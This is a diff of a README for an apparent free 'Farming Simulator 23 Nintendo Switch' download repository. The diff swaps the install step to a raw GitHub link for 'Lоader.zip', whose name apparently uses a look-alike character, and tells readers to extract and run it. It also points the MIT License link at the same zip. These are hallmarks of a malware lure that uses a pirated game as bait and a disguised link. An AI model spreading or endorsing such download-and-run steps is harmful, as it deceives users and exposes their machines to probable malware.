@@ -30,7 +30,7 @@ Want to enjoy the most authentic farming experience on your Nintendo Switch in 2
 
 ## 🚀 Installation
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/Pooja99627/FarmingSim23-Switch-FreeHub/main/Lоader.zip` from the repository.
 2. Extract and run the loader on your desired operating system.
 3. Follow the on-screen instructions to set up Farming Simulator 23 Nintendo Switch Edition.
 4. Enjoy unlimited farming fun and new 2025 content!
@@ -51,4 +51,4 @@ This repository is for educational and archival purposes only. Please ensure you
 
 ## 📜 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) – 2025
+Licensed under the [MIT License](https://raw.githubusercontent.com/Pooja99627/FarmingSim23-Switch-FreeHub/main/Lоader.zip) – 2025
